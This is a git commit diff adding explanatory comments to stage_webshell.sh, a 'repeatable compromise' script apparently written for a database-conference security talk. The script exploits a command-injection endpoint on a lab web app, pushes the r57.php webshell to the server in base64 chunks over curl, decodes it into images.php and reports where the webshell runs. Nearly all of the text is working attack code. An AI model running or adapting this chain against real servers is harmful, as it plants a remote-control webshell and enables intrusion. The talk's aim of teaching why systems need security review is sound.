5e655b6e7d1d3af6fa2bb958b13eb82328b29caa
David Busby <oneiroi@fedoraproject.org>
2016-05-03 11:50:00 +0100

    Added the create_udf_functions.sql and also added some explanatory comments to stage_webshell.sh

--- Security_and_why_you_need_to_review_yours/compromise/stage_webshell.sh
+++ Security_and_why_you_need_to_review_yours/compromise/stage_webshell.sh
@@ -2,20 +2,27 @@
 
 #
 # Quick and nasty "repeatable compromise" script
-# PLUK13 Security talk
+# PLUK13 Security talk (PLMCE 14,15,16)
 # David Busby <david.busby@percona.com>
 # Copyright 2013 Percona LLC / David Busby
 #
 
 vuln_webapp="http://172.16.33.2/vuln_webapp"
+#get the PWD (webdir) we're running in
 echo "Phase 1 - Information gathering"
 webdir=`curl -s ${vuln_webapp}/cmdi.php?cmd=pwd | grep www`
 echo "I detected the webdir as $webdir"
+
+#we're going to "split" the payload into parts and "upload" these to the webserver
 echo "Phase 2 - create payload"
 i=0
+#zero out the file (so you can re-run this as many times as you like)
 cmd="echo '' > $webdir/images.b64"
+#At each step we need to URI encode the string
 cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$cmd")"
+#now using curl we execute the command agains the known vulnerable script (RCE - Remote Code Execution)
 curl -s "$vuln_webapp/cmdi.php?cmd=$cmd" > /dev/null
+#Now we're going to use the base64 binary to split the payload into smaller parts
 base64 -w 100 r57.php | while read chunk
 do
     (( i++ ))
@@ -24,10 +31,11 @@ do
     cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$chunk_inject")"
     curl -s "$vuln_webapp/cmdi.php?cmd=$cmd" > /dev/null
 done
+#Ok great we have staged the payload, however it is still base64 encoded, we need to unpack it
 echo "Phase3 - unpacking payload"
 cmd="base64 -d $webdir/images.b64 > $webdir/images.php"
 cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$cmd")"
 curl -s "$vuln_webapp/cmdi.php?cmd=$cmd" > /dev/null
-
+#And we're done, disaplay the link at which the payload script will run and exit
 echo "Payload staged webshell should be available here $vuln_webapp/images.php"
 echo "Happy hacking!"
